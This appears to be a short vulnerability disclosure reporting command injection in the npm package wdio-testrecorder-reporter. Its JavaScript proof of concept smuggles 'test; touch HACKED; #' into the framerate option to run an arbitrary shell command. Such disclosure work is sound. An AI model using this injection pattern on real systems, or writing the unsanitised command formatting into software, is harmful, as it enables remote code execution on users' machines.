# Description
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/tamil777selvan/wdio-testrecorder-reporter/blob/master/index.js#L111

# POC

```js
// poc.js
var wdio = require('wdio-testrecorder-reporter').default;
var conv = new wdio({'outputDir':'s', 'videoOutputPath':'s', 'framerate':'test; touch HACKED; #'});
suiteStat = {};
suiteStat.complete = function(){};
conv._events['suite:start']({'type':'scenario', 'title':'s'});
conv._events['suite:end']({uid:'s'});
conv._events['suite:start']({'type':'scenario'})
conv._events['suite:end']({});

```

# Impact
`RCE` via command formatting on `wdio-testrecorder-reporter`
